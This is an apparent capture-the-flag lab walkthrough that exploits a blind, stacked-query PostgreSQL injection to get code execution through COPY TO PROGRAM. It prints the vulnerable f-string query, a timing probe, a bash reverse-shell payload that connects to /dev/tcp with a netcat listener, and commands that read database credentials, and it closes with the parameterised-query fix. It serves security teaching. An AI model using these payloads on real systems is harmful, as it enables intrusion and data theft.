# Level 3-3: RCE via COPY TO PROGRAM

**URL:** `/secrets`

**Objective:** The endpoint has a string injection point and runs as a PostgreSQL superuser. There is no output channel, the response is always the same regardless of what you inject. Get a reverse shell on the database container using `COPY TO PROGRAM`.

## Vulnerable Code

```python
with get_conn_level3_rce() as conn:
    with conn.cursor() as cur:
        query = f"SELECT valor FROM configuracoes WHERE secao = '{section}'"
        cur.execute(query)
```

The query result is discarded. Errors are discarded. The response is always `{"valor": "producao"}`. 

What makes RCE possible in this case is that the user the backend uses to connect to the database is a SUPERUSER, meaning it can execute command such as COPY TO PROGRAM. Another important detail is that autocommit is enabled, so each statement is executed immediately without needing an explicit COMMIT. This allows stacked queries to work, which is essential for this attack since we need to run multiple statements in one go.

## Exploitation

### Confirm injection with timing

Since there's no output, use `pg_sleep` to verify the injection works. Inject:

```
'; SELECT pg_sleep(3)--
```

Full query:
```sql
SELECT valor FROM configuracoes WHERE secao = ''; SELECT pg_sleep(3)--'
```

If the response takes ~3 seconds, the second statement ran. You're in a stacked query context.

### Get a reverse shell

Our objective is to get a reverse shell back to our machine, meaning a direct TCP connection from the database container to our host. There are many ways to create a reverse shell, for this you can use [revshells.com](https://www.revshells.com/) to generate a bash one-liner. In this case we'll use `COPY TO PROGRAM` to execute the payload on the server. This command takes the output of a query and pipes it into a shell command via `popen()`. The query can be anything that produces output, even a simple `SELECT 1`.

Start a listener:
```sh
nc -lvnp 4444
```

Inject the reverse shell payload as the `section` parameter:

```
'; COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/host.docker.internal/4444 0>&1"'--
```

What runs on the server:
```sql
SELECT valor FROM configuracoes WHERE secao = '';
COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/host.docker.internal/4444 0>&1"'--'
```

`COPY TO PROGRAM` pipes the query output into a shell command via `popen()` on the database host. PostgreSQL spawns bash, which connects back to your listener. The HTTP response still comes back as `{"valor": "producao"}` — that's expected.

### Get the flag from the shell

You now have a shell inside the postgres container as the `postgres` OS user. Find the database name and credentials:

```sh
env | grep POSTGRES
```

Then connect:

```sh
psql -U $POSTGRES_USER -d $POSTGRES_DB -c "SELECT segredo FROM rce_cofre"
```

## Fix

```python
query = "SELECT valor FROM configuracoes WHERE secao = %s"
cur.execute(query, (section,))
```

Parameterised queries use the extended query protocol, which rejects multiple statements entirely. Also remove SUPERUSER from the app's DB role.
